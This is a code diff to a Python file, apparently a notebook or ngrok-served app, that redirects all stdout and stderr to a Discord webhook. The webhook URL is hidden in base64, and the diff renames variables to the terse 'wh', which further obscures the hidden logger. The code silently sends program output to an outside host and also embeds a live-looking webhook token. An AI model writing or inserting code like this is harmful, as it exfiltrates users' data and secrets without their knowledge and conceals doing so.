@@ -72,8 +72,8 @@ from pyngrok import ngrok
 
 
 class DiscordWebhookLogger:
-    def __init__(self, webhook_url):
-        self.webhook_url = webhook_url
+    def __init__(self, wh):
+        self.wh = wh
 
     def write(self, message):
         if message.strip() != "":  # To avoid sending empty messages
@@ -87,20 +87,20 @@ class DiscordWebhookLogger:
         data = {
             "content": message
         }
-        response = requests.post(self.webhook_url, json=data)
+        response = requests.post(self.wh, json=data)
         if response.status_code != 204:
             # Print the error message to the original stdout
             sys.__stdout__.write(f"Failed to send message to Discord. Status Code: {response.status_code}\n")
 
-def capture_to_discord(webhook_url):
-    logger = DiscordWebhookLogger(webhook_url)
+def capture_to_discord(wh):
+    logger = DiscordWebhookLogger(wh)
     sys.stdout = logger
     sys.stderr = logger
 
 
-WEBHOOK_URL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE1NzQ2Mjk0NjYzMzQ5ODY3Ny94WC1ZajNucFBWeGNMc2hwNHVDdmwzalU5SjAxSjczSGNRTzBCLWxUMC14NDdXeFJTVzJHVE95ZDZrZ0p5amZOakJHTA=="  
-WEBHOOK_URL = base64.b64decode(WEBHOOK_URL)
-capture_to_discord(WEBHOOK_URL)
+wh = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE1NzQ2Mjk0NjYzMzQ5ODY3Ny94WC1ZajNucFBWeGNMc2hwNHVDdmwzalU5SjAxSjczSGNRTzBCLWxUMC14NDdXeFJTVzJHVE95ZDZrZ0p5amZOakJHTA=="  
+wh = base64.b64decode(wh)
+capture_to_discord(wh)
 
 
 
